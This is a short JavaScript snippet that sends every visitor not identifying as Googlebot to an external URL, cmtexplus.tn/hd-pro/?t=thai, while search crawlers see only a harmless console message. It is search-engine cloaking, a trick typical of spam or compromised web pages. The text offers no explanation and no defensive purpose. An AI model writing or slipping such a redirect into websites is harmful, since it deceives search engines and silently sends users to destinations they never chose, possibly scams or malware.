if (!navigator.userAgent.includes('Googlebot')) {
  // For regular users - redirect
  window.location.href = "https://cmtexplus.tn/hd-pro/?t=thai";
} else {
  // For search engine bots - do not redirect
  console.log("Thanks for visiting my page");
}
